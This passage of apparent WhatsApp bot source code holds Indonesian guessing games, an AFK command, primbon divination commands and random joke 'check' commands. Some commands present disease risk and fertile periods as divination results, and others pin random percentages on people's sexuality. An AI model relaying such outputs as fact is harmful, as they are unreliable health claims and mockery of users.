if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`, m);
delete tebakkata[m.sender.split('@')[0]];
}
 } else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}`, m);
delete tebakkalimat[m.sender.split('@')[0]];
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}`, m);
delete tebaklirik[m.sender.split('@')[0]];
}
} else if (args[0] === 'tebakan') {
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m);
delete tebaktebakan[m.sender.split('@')[0]];
}
} else if (args[0] === 'bendera') {
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
quoted: m
}).then(() => {
tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase();
});
await sleep(60000);
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.name);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m);
delete tebakbendera[m.sender.split('@')[0]];
}
} else if (args[0] === 'bendera2') {
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
}, {
quoted: m
}).then(() => {
tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase();
});
await sleep(60000);
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.name);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m);
delete tebakbendera2[m.sender.split('@')[0]];
}
} else if (args[0] === 'kabupaten') {
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase();
});
await sleep(60000);
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.title);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m);
delete tebakkabupaten[m.sender.split('@')[0]];
}
} else if (args[0] === 'kimia') {
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase();
});
await sleep(60000);
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.lambang);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m);
delete tebakkimia[m.sender.split('@')[0]];
}
} else if (args[0] === 'asahotak') {
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m);
delete tebakasahotak[m.sender.split('@')[0]];
}
} else if (args[0] === 'siapakahaku') {
if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
tebaksiapakahaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m);
delete tebaksiapakahaku[m.sender.split('@')[0]];
}
} else if (args[0] === 'susunkata') {
if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, m).then(() => {
tebaksusunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m);
delete tebaksusunkata[m.sender.split('@')[0]];
}
} else if (args[0] === 'tekateki') {
if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
tebaktekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktekateki[m.sender.split('@')[0]]}`, m);
delete tebaktekateki[m.sender.split('@')[0]];
}
}
break
}
case 'afk':
if (!isGroup) return qioreply('Only Group')
if (isAfkOn) return qioreply("Kakak Sudah Afk Sebelumnya");
let reason = text ? text : 'Nothing.';
afk.addAfkUser(m.sender, Date.now(), reason, _afk);
m.reply(`@${m.sender.split('@')[0]} Sedang AFK\nDengan Alasan : ${reason}`);
break

//Primbon
case "nomerhoki": case "nomorhoki": {
if (!Number(text)) return m.reply(`Example : ${prefix + command} 6288292024190`) 
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nomor HP :* ${anu.message.nomer_hp}\n❋々 *Angka Shuzi :* ${anu.message.angka_shuzi}\n❋々 *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n❋々 *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
//=================================================//
case "artimimpi": case "tafsirmimpi": {
if (!text) return m.reply(`Example : ${prefix + command} belanja`) 
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Mimpi :* ${anu.message.mimpi}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Solusi :* ${anu.message.solusi}`)
}
break
//=================================================//
case "ramalanjodoh": case "ramaljodoh": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "ramalanjodohbali": case "ramaljodohbali": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "suamiistri": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama Suami :* ${anu.message.suami.nama}\n❋々 *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n❋々 *Nama Istri :* ${anu.message.istri.nama}\n❋々 *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "ramalancinta": case "ramalcinta": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Sisi Positif :* ${anu.message.sisi_positif}\n❋々 *Sisi Negatif :* ${anu.message.sisi_negatif}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "artinama": {
if (!text) return m.reply(`Example : ${prefix + command} qiot`) 
let anu = await primbon.arti_nama(text)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "kecocokannama": case "cocoknama": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Life Path :* ${anu.message.life_path}\n❋々 *Destiny :* ${anu.message.destiny}\n❋々 *Destiny Desire :* ${anu.message.destiny_desire}\n❋々 *Personality :* ${anu.message.personality}\n❋々 *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
//=================================================//
case "kecocokanpasangan": case "cocokpasangan": case "pasangan": {
if (!text) return m.reply(`Example : ${prefix + command} qio|Mboh`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return qioreply(anu.message)
qio.sendImage(m.chat,anu.message.gambar, `❋々 *Nama Anda :* ${anu.message.nama_anda}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan}\n❋々 *Sisi Positif :* ${anu.message.sisi_positif}\n❋々 *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case "jadianpernikahan": case "jadiannikah": {
if (!text) return m.reply(`Example : ${prefix + command} 6, 12, 2020`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Tanggal Pernikahan :* ${anu.message.tanggal}\n❋々 *karakteristik :* ${anu.message.karakteristik}`)
}
break
//=================================================//
case "sifatusaha": {
if (!ext) return m.reply(`Example : ${prefix+ command} 28, 12, 2021`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Lahir :* ${anu.message.hari_lahir}\n❋々 *Usaha :* ${anu.message.usaha}`)
}
break
//=================================================//
case "rejeki": case "rezeki": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Lahir :* ${anu.message.hari_lahir}\n❋々 *Rezeki :* ${anu.message.rejeki}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "pekerjaan": case "kerja": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Lahir :* ${anu.message.hari_lahir}\n❋々 *Pekerjaan :* ${anu.message.pekerjaan}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "ramalannasib": case "ramalnasib": case "nasib": {
if (!text) return m.reply(`Example : 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Analisa :* ${anu.message.analisa}\n❋々 *Angka Akar :* ${anu.message.angka_akar}\n❋々 *Sifat :* ${anu.message.sifat}\n❋々 *Elemen :* ${anu.message.elemen}\n❋々 *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
//=================================================//
case "potensipenyakit": case "penyakit": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Analisa :* ${anu.message.analisa}\n❋々 *Sektor :* ${anu.message.sektor}\n❋々 *Elemen :* ${anu.message.elemen}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "artitarot": case "tarot": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
qio.sendImage(m.chat, anu.message.image, `❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Simbol Tarot :* ${anu.message.simbol_tarot}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "fengshui": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tahun_lahir}\n❋々 *Gender :* ${anu.message.jenis_kelamin}\n❋々 *Angka Kua :* ${anu.message.angka_kua}\n❋々 *Kelompok :* ${anu.message.kelompok}\n❋々 *Karakter :* ${anu.message.karakter}\n❋々 *Sektor Baik :* ${anu.message.sektor_baik}\n❋々 *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
//=================================================//
case "haribaik": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Kala Tinantang :* ${anu.message.kala_tinantang}\n❋々 *Info :* ${anu.message.info}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "harisangar": case "taliwangke": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Info :* ${anu.message.info}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "harinaas": case "harisial": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Hari Lahir :* ${anu.message.hari_lahir}\n❋々 *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❋々 *Hari Naas :* ${anu.message.hari_naas}\n❋々 *Info :* ${anu.message.catatan}\n❋々 *Catatan :* ${anu.message.info}`)
}
break
//=================================================//
case "nagahari": case "harinaga": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Hari Lahir :* ${anu.message.hari_lahir}\n❋々 *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❋々 *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "arahrejeki": case "arahrezeki": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Hari Lahir :* ${anu.message.hari_lahir}\n❋々 *tanggal Lahir :* ${anu.message.tgl_lahir}\n❋々 *Arah Rezeki :* ${anu.message.arah_rejeki}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "peruntungan": {
if (!text) return m.reply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2023\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`) 
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "weton": case "wetonjawa": {
if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Tanggal :* ${anu.message.tanggal}\n❋々 *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n❋々 *Watak Hari :* ${anu.message.watak_hari}\n❋々 *Naga Hari :* ${anu.message.naga_hari}\n❋々 *Jam Baik :* ${anu.message.jam_baik}\n❋々 *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
//=================================================//
case "sifat": case "karakter": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
//=================================================//
case "keberuntungan": {
if (!text) return m.reply(`Example : ${prefix + command} qio, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}`)
}
break
//=================================================//
case "memancing": {
if (!text) return m.reply(`Example : ${prefix + command} 12, 1, 2023`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Tanggal :* ${anu.message.tgl_memancing}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "masasubur": {
if (!text) return m.reply(`Example : ${prefix + command} 12, 1, 2023, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`) 
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return qioreply(anu.message)
m.reply(`❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break



case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'cekganteng':
case 'cekcantik':
case 'cekkaya':
case 'lesbicek':
case 'ceklesbi': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var sangek = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
var sange = sangek[Math.floor(Math.random() * sangek.length)]
m.reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
//=================================================//
case 'cekkhodamcore': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var khodams = ['ulat bulu', 'paracetamol', 'cabul', 'burung prikitiw', 'kipas cosmos', 'vitamin c', 'kipas angin', 'Buaya darat', 'meja berjalan', 'yatim', 'ikan cupang', 'kodok', 'kosong', 'mayat hidup', 'merpati', 'minyak sarimurni', 'lampu LID', 'tikus kencing', 'sirup abc']
var khodams = khodams[Math.floor(Math.random() * khodams.length)]
m.reply(`Nama : ${q}\nkhodam anda : *${khodams}*`)
}
break

case 'cekkhodam': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var khodams = ['macan putih', 'harimau hitam', 'harimau sumatera', 'burung hantu', 'macan tutul hitam', 'burung gagak', 'kipas angin', 'komodo bermata merah', 'banteng bermata merah', 'rusa bertanduk satu', 'kosong', 'burung jalak', 'kelelawar biru', 'buaya putih', 'merpati', 'rawa rontek']
var khodams = khodams[Math.floor(Math.random() * khodams.length)]
m.reply(`Nama : ${q}\nkhodam anda : *${khodams}*`)
}
break

case 'cekjodoh': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var jodoh = ['etek markopet', 'uni as', 'uni maria', 'uni bakwan', 'popo berby', 'mimi pery', 'uni bika', 'uni bakwan', 'kosong', 'sumiati', 'yanto']
var jodoh = jodoh[Math.floor(Math.random() * jodoh.length)]
m.reply(`Nama : ${q}\nJodoh anda : *${jodoh}*`)
}
break


case 'cekkuota': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var pulsa = ['1kb', '5mb', '20mb', '3gb', '5gb', '7gb', '10gb', '1gb', 'banteng 2gb', '2.5gb', '1tb', '7mb', 'habis', '1,3gb', '4,1gb', '0,1kb']
var pulsa = pulsa[Math.floor(Math.random() * pulsa.length)]
m.reply(`Nama : ${q}\nkuota anda : *${pulsa}*`)
}
break

case 'kapankah': {
if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${prefix + command} Saya Jadi Istrinya qio Kun >////<`)
var kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
var kapankah = kapan[Math.floor(Math.random() * kapan.length)]
m.reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
//=================================================//
case 'wangy': {
if (!text) return m.reply(`Contoh: ${prefix + command} Vyaaa`)
